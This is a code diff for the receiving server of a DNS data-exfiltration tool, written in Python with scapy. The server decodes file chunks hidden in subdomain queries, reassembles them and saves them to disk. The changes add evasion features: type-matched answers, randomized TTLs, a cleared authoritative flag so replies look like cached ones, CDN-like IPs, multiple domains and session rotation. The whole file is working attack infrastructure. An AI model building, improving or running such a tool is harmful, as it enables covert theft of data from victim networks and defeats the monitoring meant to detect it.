@@ -1,20 +1,29 @@
 #!/usr/bin/env python3
 """DNS Exfiltration - Authoritative DNS Server (Receiver)
 
-Runs as an authoritative DNS server for the exfiltration domain.
+Runs as an authoritative DNS server for the exfiltration domain(s).
 Extracts encoded data from incoming DNS subdomain queries,
-responds with valid DNS answers, and reassembles the exfiltrated file.
+responds with valid DNS answers matching the query type, and
+reassembles the exfiltrated file.
+
+Anti-detection in responses:
+- Matches response type to query type (A->IP, AAAA->IPv6, CNAME->domain)
+- Randomized TTL per response (30-600s)
+- No authoritative flag (aa=0) to blend with cached responses
+- Realistic response IPs from CDN ranges
 
 Setup:
-    1. Register a domain (e.g., analytics-cdn.example.com)
+    1. Register domain(s) (e.g., analytics-cdn.example.com)
     2. Set NS records to point to this server's IP
     3. Run: sudo python3 dns_server.py
 
 Query format:
-    <data_labels>.<session_id>.<seq_hex>.<base_domain>
-    Metadata:  m<hash_labels>.<session_id>.0000.<base_domain>
+    <data_labels>.<session_id>.<base_domain>
+    Metadata:  m<data_labels>.<session_id>.<base_domain>
+    Rotation:  <old_id_labels>.r<new_id>.<base_domain>
 """
 
+import gzip
 import hashlib
 import os
 import random
@@ -28,30 +37,31 @@ from scapy.all import (
 )
 
 from config import (
-    BASE_DOMAIN,
+    BASE_DOMAINS,
     DNS_PORT,
     ENCODING_STRATEGY,
     HASH_ALGORITHM,
     METADATA_PREFIX,
     OUTPUT_DIR,
     RESPONSE_IP_POOL,
-    RESPONSE_TTL,
-    SEQUENCE_PRIME,
-    SEQUENCE_SEED,
-    SESSION_ID_LENGTH,
+    RESPONSE_TTL_RANGE,
+    SESSION_KEY_LENGTH,
 )
-from encoding import decode_hex_split, decode_wordlist
+from encoding import decode_hex_split, decode_wordlist, extract_sequence
 
 
 class Session:
     """Tracks an active file transfer session."""
 
-    def __init__(self, session_id):
+    def __init__(self, session_id, session_key=None):
         self.session_id = session_id
+        self.session_key = session_key
         self.chunk_count = None
         self.original_hash = None
+        self.compressed = False
         self.chunks = {}
         self.created_at = time.time()
+        self.linked_from = None  # previous session ID if rotated
 
     def is_complete(self):
         if self.chunk_count is None:
@@ -59,22 +69,16 @@ class Session:
         return len(self.chunks) >= self.chunk_count
 
     def reassemble(self):
-        """Reassemble chunks in correct order using inverse permutation."""
+        """Reassemble chunks in sequence order."""
         if not self.is_complete():
             return None
 
-        # Reverse the sequence obfuscation
         data = b""
-        for orig_seq in range(1, self.chunk_count + 1):
-            # The client sent with obfuscated seq numbers
-            # obfuscated = (orig * PRIME + SEED) % total
-            obfuscated = (orig_seq * SEQUENCE_PRIME + SEQUENCE_SEED) % (self.chunk_count + 1)
-            if obfuscated == 0:
-                obfuscated = orig_seq  # avoid collision with metadata seq
-            if obfuscated in self.chunks:
-                data += self.chunks[obfuscated]
+        for seq in range(1, self.chunk_count + 1):
+            if seq in self.chunks:
+                data += self.chunks[seq]
             else:
-                print(f"  Missing chunk with obfuscated seq {obfuscated}")
+                print(f"  Missing chunk seq {seq}")
                 return None
         return data
 
@@ -84,7 +88,15 @@ class DNSExfilServer:
 
     def __init__(self):
         self.sessions = {}
+        self.session_chains = {}  # maps new_id -> old_id for linking
         os.makedirs(OUTPUT_DIR, exist_ok=True)
+        # Derive session key (must match client's key for XOR decode)
+        # In production, this would be pre-shared or derived from a shared secret
+        self._default_session_key = None
+
+    def set_session_key(self, key_hex):
+        """Set the shared session key (hex string)."""
+        self._default_session_key = bytes.fromhex(key_hex)
 
     def decode_labels(self, labels):
         """Decode data labels using the configured strategy."""
@@ -95,50 +107,53 @@ class DNSExfilServer:
         else:
             raise ValueError(f"Unknown encoding strategy: {ENCODING_STRATEGY}")
 
+    def _is_our_domain(self, qname):
+        """Check if query is for any of our domains."""
+        qname_clean = qname.rstrip(".")
+        for domain in BASE_DOMAINS:
+            if qname_clean.endswith(domain):
+                return domain
+        return None
+
     def parse_query(self, qname):
         """Parse a DNS query name into components.
 
-        Format: <data_labels>.<session_id>.<seq_hex>.<base_domain>
+        Format: <data_labels>.<session_id>.<base_domain>
 
-        Returns: (data_labels, session_id, sequence_num, is_metadata)
+        Returns: (data_labels, session_id, base_domain, is_metadata, is_rotation)
         """
-        # Remove trailing dot
         if qname.endswith("."):
             qname = qname[:-1]
 
-        # Strip base domain
-        if not qname.endswith(BASE_DOMAIN):
+        matched_domain = self._is_our_domain(qname)
+        if not matched_domain:
             return None
 
-        prefix = qname[:-(len(BASE_DOMAIN) + 1)]  # +1 for the dot
+        prefix = qname[:-(len(matched_domain) + 1)]
         parts = prefix.split(".")
 
-        if len(parts) < 3:
+        if len(parts) < 2:
             return None
 
-        # Last part before base domain = seq (hex)
-        seq_hex = parts[-1]
-        # Second to last = session ID
-        session_id = parts[-2]
-        # Everything before = data labels
-        data_labels = parts[:-2]
+        # Last part = session ID (may start with 'r' for rotation)
+        session_id = parts[-1]
+        data_labels = parts[:-1]
 
-        try:
-            seq_num = int(seq_hex, 16)
-        except ValueError:
-            return None
+        # Check for rotation announcement
+        is_rotation = session_id.startswith("r")
+        if is_rotation:
+            session_id = session_id[1:]  # strip 'r' prefix
 
-        # Check if metadata (first data label starts with metadata prefix)
+        # Check for metadata
         is_metadata = False
         if data_labels and data_labels[0].startswith(METADATA_PREFIX):
             is_metadata = True
-            # Strip the metadata prefix from first label
             data_labels[0] = data_labels[0][len(METADATA_PREFIX):]
 
-        return data_labels, session_id, seq_num, is_metadata
+        return data_labels, session_id, matched_domain, is_metadata, is_rotation
 
     def build_response(self, pkt):
-        """Build a valid DNS response for the query."""
+        """Build a valid DNS response matching the query type."""
         qname = pkt[DNSQR].qname
         qtype = pkt[DNSQR].qtype
         txid = pkt[DNS].id
@@ -147,65 +162,142 @@ class DNSExfilServer:
         src_port = pkt[UDP].sport
         dst_ip = pkt[IP].dst
 
-        rdata = random.choice(RESPONSE_IP_POOL)
+        # Map query type number to response
+        ttl = random.randint(*RESPONSE_TTL_RANGE)
+
+        if qtype == 28:  # AAAA
+            pool = RESPONSE_IP_POOL.get("AAAA", ["2606:4700::1"])
+            rdata = random.choice(pool)
+            rr_type = "AAAA"
+        elif qtype == 5:  # CNAME
+            pool = RESPONSE_IP_POOL.get("CNAME", ["cdn.example.net."])
+            rdata = random.choice(pool)
+            rr_type = "CNAME"
+        else:  # A (type 1) and fallback
+            pool = RESPONSE_IP_POOL.get("A", ["104.16.132.229"])
+            rdata = random.choice(pool)
+            rr_type = "A"
 
         response = (
             IP(src=dst_ip, dst=src_ip)
             / UDP(sport=DNS_PORT, dport=src_port)
             / DNS(
                 id=txid,
-                qr=1,      # response
-                aa=1,       # authoritative
-                rcode=0,    # no error
+                qr=1,       # response
+                aa=0,        # NOT authoritative (blend with cached)
+                rd=1,        # recursion desired (mimic recursive response)
+                ra=1,        # recursion available
+                rcode=0,     # no error
                 qd=DNSQR(qname=qname, qtype=qtype),
                 an=DNSRR(
                     rrname=qname,
-                    type="A",
+                    type=rr_type,
                     rdata=rdata,
-                    ttl=RESPONSE_TTL,
+                    ttl=ttl,
                 ),
             )
         )
         return response
 
-    def handle_metadata(self, session, data_labels):
-        """Process a metadata query containing chunk count and hash."""
+    def _get_root_session(self, session_id):
+        """Follow session chain to find the root session with all chunks."""
+        visited = set()
+        current = session_id
+        while current in self.session_chains and current not in visited:
+            visited.add(current)
+            current = self.session_chains[current]
+        return current
+
+    def handle_rotation(self, data_labels, new_session_id):
+        """Process a session rotation announcement."""
         try:
             raw = self.decode_labels(data_labels)
-            text = raw.decode()
-            # Format: chunk_count||hash
+            old_session_id = raw.decode()
+
+            # Link new session to old session
+            self.session_chains[new_session_id] = old_session_id
+
+            # If old session exists, new session inherits its data
+            root_id = self._get_root_session(new_session_id)
+            if root_id in self.sessions:
+                print(f"  Session rotation: {old_session_id} -> {new_session_id}")
+                # Create new session entry pointing to root's data
+                if new_session_id not in self.sessions:
+                    self.sessions[new_session_id] = self.sessions[root_id]
+            else:
+                print(f"  Rotation announced but root session {root_id} not found yet")
+
+        except Exception as e:
+            print(f"  Rotation decode error: {e}")
+
+    def handle_metadata(self, session, data_labels):
+        """Process a metadata query containing chunk count, hash, and compression flag."""
+        try:
+            raw = self.decode_labels(data_labels)
+
+            # Extract embedded sequence number (should be 0 for metadata)
+            if self._default_session_key:
+                _, raw_data = extract_sequence(raw, self._default_session_key)
+                text = raw_data.decode()
+            else:
+                # If no key set, try to decode raw (backwards compat)
+                text = raw.decode()
+
             parts = text.split("||")
-            if len(parts) != 2:
+            if len(parts) >= 2:
+                session.chunk_count = int(parts[0])
+                session.original_hash = parts[1]
+                if len(parts) >= 3:
+                    session.compressed = parts[2] == "1"
+                print(f"  Metadata: {session.chunk_count} chunks, "
+                      f"hash={session.original_hash[:16]}..., "
+                      f"compressed={session.compressed}")
+            else:
                 print(f"  Invalid metadata format: {text}")
-                return
-            session.chunk_count = int(parts[0])
-            session.original_hash = parts[1]
-            print(f"  Metadata: {session.chunk_count} chunks, hash={session.original_hash[:16]}...")
         except Exception as e:
             print(f"  Metadata decode error: {e}")
 
-    def handle_data(self, session, data_labels, seq_num):
-        """Process a data query containing a file chunk."""
+    def handle_data(self, session, data_labels):
+        """Process a data query containing a file chunk with embedded sequence."""
         try:
             raw = self.decode_labels(data_labels)
-            session.chunks[seq_num] = raw
+
+            if self._default_session_key:
+                seq_num, chunk_data = extract_sequence(raw, self._default_session_key)
+            else:
+                # Fallback: first 2 bytes are raw sequence
+                seq_num = int.from_bytes(raw[:2], "big")
+                chunk_data = raw[2:]
+
+            if seq_num not in session.chunks:
+                session.chunks[seq_num] = chunk_data
         except Exception as e:
-            print(f"  Data decode error (seq {seq_num}): {e}")
+            print(f"  Data decode error: {e}")
 
     def check_completion(self, session):
         """Check if session is complete and save file if so."""
         if not session.is_complete():
             received = len(session.chunks)
             total = session.chunk_count or "?"
-            print(f"  Progress: {received}/{total} chunks")
+            if received % 10 == 0 or received == total:
+                print(f"  Progress: {received}/{total} chunks")
             return
 
         print(f"  All {session.chunk_count} chunks received. Reassembling...")
         data = session.reassemble()
 
         if data is None:
-            print("  Reassembly failed - missing chunks after permutation.")
+            print("  Reassembly failed - missing chunks.")
             return
+
+        # Decompress if needed
+        if session.compressed:
+            try:
+                data = gzip.decompress(data)
+                print(f"  Decompressed: {len(data)} bytes")
+            except Exception as e:
+                print(f"  Decompression failed: {e}")
+                return
 
         # Verify hash
         hasher = hashlib.new(HASH_ALGORITHM)
@@ -213,7 +305,10 @@ class DNSExfilServer:
         received_hash = hasher.hexdigest()
 
         if received_hash == session.original_hash:
-            filename = os.path.join(OUTPUT_DIR, f"exfil_{session.session_id}_{int(time.time())}")
+            filename = os.path.join(
+                OUTPUT_DIR,
+                f"exfil_{session.session_id}_{int(time.time())}"
+            )
             with open(filename, "wb") as f:
                 f.write(data)
             print(f"  HASH VERIFIED - File saved: {filename} ({len(data)} bytes)")
@@ -223,7 +318,8 @@ class DNSExfilServer:
             print(f"    Got:      {received_hash}")
 
         # Clean up session
-        del self.sessions[session.session_id]
+        if session.session_id in self.sessions:
+            del self.sessions[session.session_id]
 
     def process_packet(self, pkt):
         """Process an incoming DNS query packet."""
@@ -232,11 +328,10 @@ class DNSExfilServer:
 
         qname = pkt[DNSQR].qname.decode()
 
-        # Only process queries for our domain
-        if not qname.rstrip(".").endswith(BASE_DOMAIN):
+        if not self._is_our_domain(qname):
             return
 
-        # Send valid DNS response
+        # Send valid DNS response (type-matched)
         response = self.build_response(pkt)
         send(response, verbose=False)
 
@@ -245,31 +340,40 @@ class DNSExfilServer:
         if parsed is None:
             return
 
-        data_labels, session_id, seq_num, is_metadata = parsed
+        data_labels, session_id, base_domain, is_metadata, is_rotation = parsed
 
-        # Get or create session
-        if session_id not in self.sessions:
-            self.sessions[session_id] = Session(session_id)
-            print(f"\n[+] New session: {session_id}")
+        # Handle session rotation announcements
+        if is_rotation:
+            self.handle_rotation(data_labels, session_id)
+            return
 
-        session = self.sessions[session_id]
+        # Get or create session (follow chain to root)
+        root_id = self._get_root_session(session_id)
+        if root_id not in self.sessions:
+            self.sessions[root_id] = Session(root_id)
+            # Also map current ID if different
+            if session_id != root_id:
+                self.sessions[session_id] = self.sessions[root_id]
+            print(f"\n[+] New session: {root_id}")
+
+        session = self.sessions[root_id]
 
         if is_metadata:
             self.handle_metadata(session, data_labels)
         else:
-            # Skip duplicate chunks (client sends duplicates for anti-detection)
-            if seq_num not in session.chunks:
-                self.handle_data(session, data_labels, seq_num)
+            self.handle_data(session, data_labels)
 
         self.check_completion(session)
 
     def run(self):
         """Start the DNS server."""
         print(f"DNS Exfiltration Server")
-        print(f"  Domain:   {BASE_DOMAIN}")
-        print(f"  Port:     {DNS_PORT}")
+        print(f"  Domains: {', '.join(BASE_DOMAINS)}")
+        print(f"  Port:    {DNS_PORT}")
         print(f"  Encoding: {ENCODING_STRATEGY}")
         print(f"  Output:   {OUTPUT_DIR}")
+        if self._default_session_key:
+            print(f"  Session key: {self._default_session_key.hex()}")
         print(f"  Listening...\n")
 
         bpf_filter = f"udp port {DNS_PORT}"
@@ -290,6 +394,12 @@ def main():
         sys.exit(1)
 
     server = DNSExfilServer()
+
+    # Accept session key as argument for XOR sequence decoding
+    if len(sys.argv) > 1:
+        server.set_session_key(sys.argv[1])
+        print(f"Session key set: {sys.argv[1]}")
+
     server.run()
 
 
